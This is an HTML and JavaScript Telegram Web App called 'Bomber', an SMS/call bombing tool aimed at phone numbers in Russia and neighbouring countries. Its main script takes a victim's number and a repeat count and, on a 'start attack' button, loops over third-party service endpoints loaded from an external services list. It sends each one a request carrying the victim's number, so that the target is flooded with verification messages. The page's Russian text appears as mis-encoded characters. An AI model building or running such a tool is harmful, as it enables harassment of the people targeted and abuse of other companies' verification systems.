<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=yes">
    <title>Bomber ¬∑ –ª—É–Ω–∞ (–°–ù–ì)</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="services.js"></script>
    <style>
        :root { --accent: #b0b0ff; --bg-glow: radial-gradient(circle at 30% 20%, #1e1e2f, #0a0c14); }
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent !important; }
        @keyframes entry-fade { 0% { opacity: 0; transform: scale(0.95) translateY(10px); filter: blur(10px); } 100% { opacity: 1; transform: scale(1) translateY(0); filter: blur(0); } }
        .entry-anim { animation: entry-fade 1.2s cubic-bezier(0.22, 1, 0.36, 1) forwards; }
        body { background: var(--bg-glow); color: #eaeaff; font-family: 'Inter', sans-serif; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 1rem; position: relative; overflow: hidden; }
        #bg-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; pointer-events: none; }
        .card { width: 100%; max-width: 320px; text-align: center; position: relative; z-index: 10; }
        .header { display: flex; align-items: center; justify-content: center; margin-bottom: 1.5rem; gap: 4px; }
        .title { font-size: 2.2rem; font-weight: 700; color: #f0f0ff; text-shadow: 0 0 10px var(--accent); line-height: 1; }
        .bomb-emoji { font-size: 2.2rem; cursor: pointer; filter: brightness(1.2) drop-shadow(0 0 5px var(--accent)); display: inline-block; }
        .phone-field { display: flex; align-items: center; background: rgba(18, 18, 30, 0.8); border: 1px solid #5f5f8f; border-radius: 14px; backdrop-filter: blur(8px); width: 185px; padding: 2px; }
        .code-selector { padding: 0.3rem 0.5rem; cursor: pointer; border-right: 1px solid #5f5f8f; font-size: 0.8rem; position: relative; color: #f0f0ff; white-space: nowrap; }
        .code-dropdown { position: absolute; top: calc(100% + 10px); left: 0; background: rgba(30, 30, 50, 0.98); border: 2px solid var(--accent); border-radius: 14px; display: none; z-index: 1000; min-width: 160px; backdrop-filter: blur(15px); }
        .code-selector.active .code-dropdown { display: block; animation: entry-fade 0.3s ease-out; }
        .code-item { padding: 10px 12px; font-size: 0.75rem; border-bottom: 1px solid rgba(255,255,255,0.05); cursor: pointer; text-align: left; }
        .phone-number-input { background: transparent; border: none; color: #fff; font-size: 0.8rem; padding: 5px 6px; outline: none; width: 100%; font-family: monospace; }
        .row { display: flex; justify-content: center; align-items: stretch; gap: 6px; margin-bottom: 1.5rem; position: relative; z-index: 20; }
        .repeats { display: flex; align-items: center; gap: 3px; background: rgba(20, 20, 35, 0.7); border: 1px solid #5f5f8f; border-radius: 12px; padding: 0 8px; }
        .repeats-symbol { font-size: 0.9rem; color: var(--accent); font-weight: bold; }
        .repeats-input { width: 30px; background: transparent; border: none; color: #fff; text-align: center; outline: none; font-weight: 700; font-size: 0.8rem; }
        .repeats-max { font-size: 0.6rem; color: #fff; background: rgba(180,180,255,0.1); padding: 3px 6px; border-radius: 6px; display: flex; align-items: center; gap: 4px; border: 1px solid rgba(176, 176, 255, 0.3); }
        .atom-svg { width: 16px; height: 16px; filter: drop-shadow(0 0 5px #8a8aff); }
        .attack-btn { width: 210px; background: rgba(255, 255, 255, 0.08); border: 1px solid var(--accent); border-radius: 100px; color: #fff; padding: 12px; cursor: pointer; font-weight: 700; text-transform: uppercase; letter-spacing: 2px; }
        .loading-overlay { position: fixed; inset: 0; background: rgba(10, 10, 20, 0.9); display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 5000; }
        .loading-overlay.show { display: flex; }
        .funny-progress-bg { width: 220px; height: 4px; background: rgba(255,255,255,0.05); border-radius: 10px; margin-top: 15px; overflow: hidden; }
        .funny-progress-fill { height: 100%; width: 0%; background: var(--accent); transition: 0.3s ease; }
    </style>
</head>
<body>

<canvas id="bg-canvas"></canvas>

<div class="card entry-anim">
    <div class="header">
        <span class="title">Bomber</span>
        <span class="bomb-emoji" id="bombLogo">üí£</span>
    </div>
    
    <div class="row">
        <div class="phone-field" id="phoneBox">
            <div class="code-selector" id="codeSelector">
                <span id="selectedCode">üá∑üá∫ +7</span>
                <div class="code-dropdown" id="codeDropdown">
                    <div class="code-item" data-code="7">üá∑üá∫ +7 (–†–§)</div>
                    <div class="code-item" data-code="77">üá∞üáø +77 (–ö–ó)</div>
                    <div class="code-item" data-code="380">üá∫üá¶ +380 (–£–ö–†)</div>
                    <div class="code-item" data-code="375">üáßüáæ +375 (–ë–ï–õ)</div>
                </div>
            </div>
            <input class="phone-number-input" type="text" id="localNumber" placeholder="912 345 67 89" inputmode="numeric">
        </div>
        
        <div class="repeats">
            <span class="repeats-symbol">‚Ü≥‚Ü∞</span>
            <input class="repeats-input" type="number" id="repeat" value="1" min="1">
            <span class="repeats-max">
                <svg class="atom-svg" viewBox="0 0 24 24" fill="none" stroke="#b0b0ff" stroke-width="1.5">
                    <circle cx="12" cy="12" r="2" fill="#b0b0ff"/><ellipse cx="12" cy="12" rx="10" ry="4"/><ellipse cx="12" cy="12" rx="10" ry="4" transform="rotate(60 12 12)"/><ellipse cx="12" cy="12" rx="10" ry="4" transform="rotate(120 12 12)"/>
                </svg>
                <span id="servicesCounter">0</span>
            </span>
        </div>
    </div>
    
    <button class="attack-btn" id="go">–ù–ê–ß–ê–¢–¨ –ê–¢–ê–ö–£</button>
</div>

<div class="loading-overlay" id="loadingOverlay">
    <div id="statusTxt" style="color:var(--accent); font-family:monospace;">–ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è...</div>
    <div class="funny-progress-bg"><div class="funny-progress-fill" id="progressFill"></div></div>
    <button id="stopAttack" style="margin-top:20px; background:none; border:1px solid #ff4444; color:#ff4444; padding:5px 15px; border-radius:20px; cursor:pointer; font-size:0.7rem;">–û–°–¢–ê–ù–û–í–ò–¢–¨</button>
</div>

<script>
    const tg = window.Telegram.WebApp;
    tg.expand();

    (function() {
        let loadedServices = ServiceManager.getServices();
        document.getElementById('servicesCounter').innerText = loadedServices.length;
        let isAttacking = false;

        async function executeRequest(service, phone) {
            const finalUrl = service.url.replace(/%phone%/g, phone);
            let bodyData = null;
            if (service.method === "POST" && service.body) {
                bodyData = (typeof service.body === 'object') ? JSON.stringify(service.body).replace(/%phone%/g, phone) : service.body.replace(/%phone%/g, phone);
            }
            try {
                await fetch(finalUrl, {
                    method: service.method,
                    mode: 'no-cors',
                    headers: { 'Content-Type': (typeof service.body === 'object') ? 'application/json' : 'application/x-www-form-urlencoded', ...service.headers },
                    body: bodyData
                });
            } catch (e) {}
        }

        document.getElementById('go').onclick = async () => {
            const num = document.getElementById('localNumber').value.replace(/\D/g, '');
            if(num.length < 7) return;

            const code = document.querySelector('.code-item[style*="background"]').dataset.code || "7"; 
            // –£–ø—Ä–æ—Å—Ç–∏–º –ø–æ–ª—É—á–µ–Ω–∏–µ –∫–æ–¥–∞ –¥–ª—è –Ω–∞–¥–µ–∂–Ω–æ—Å—Ç–∏:
            const currentCode = document.getElementById('selectedCode').innerText.split('+')[1];
            
            isAttacking = true;
            document.getElementById('loadingOverlay').classList.add('show');
            tg.HapticFeedback.impactOccurred('heavy');

            const repeats = parseInt(document.getElementById('repeat').value) || 1;
            const total = loadedServices.length * repeats;
            let count = 0;

            for(let r=0; r<repeats && isAttacking; r++) {
                for(let s of loadedServices) {
                    if(!isAttacking) break;
                    await executeRequest(s, currentCode + num);
                    count++;
                    document.getElementById('progressFill').style.width = (count/total*100) + "%";
                    document.getElementById('statusTxt').innerText = `–ê–¢–ê–ö–ê: ${count}/${total}`;
                    await new Promise(res => setTimeout(res, 120));
                }
            }
            isAttacking = false;
            document.getElementById('statusTxt').innerText = "–ó–ê–í–ï–†–®–ï–ù–û";
            setTimeout(() => document.getElementById('loadingOverlay').classList.remove('show'), 1500);
        };

        document.getElementById('stopAttack').onclick = () => isAttacking = false;
        document.getElementById('codeSelector').onclick = (e) => { e.stopPropagation(); document.getElementById('codeSelector').classList.toggle('active'); };
        document.querySelectorAll('.code-item').forEach(i => i.onclick = function() {
            document.getElementById('selectedCode').innerText = this.innerText.split(' (')[0];
        });
        window.onclick = () => document.getElementById('codeSelector').classList.remove('active');

        const canvas = document.getElementById('bg-canvas');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
        function draw() {
            ctx.fillStyle = 'rgba(10, 12, 20, 0.2)';
            ctx.fillRect(0,0,canvas.width, canvas.height);
            for(let i=0; i<2; i++) {
                ctx.fillStyle = '#b0b0ff'; ctx.beginPath();
                ctx.arc(Math.random()*canvas.width, Math.random()*canvas.height, 1, 0, Math.PI*2); ctx.fill();
            }
            requestAnimationFrame(draw);
        }
        draw();
    })();
</script>
</body>
</html>
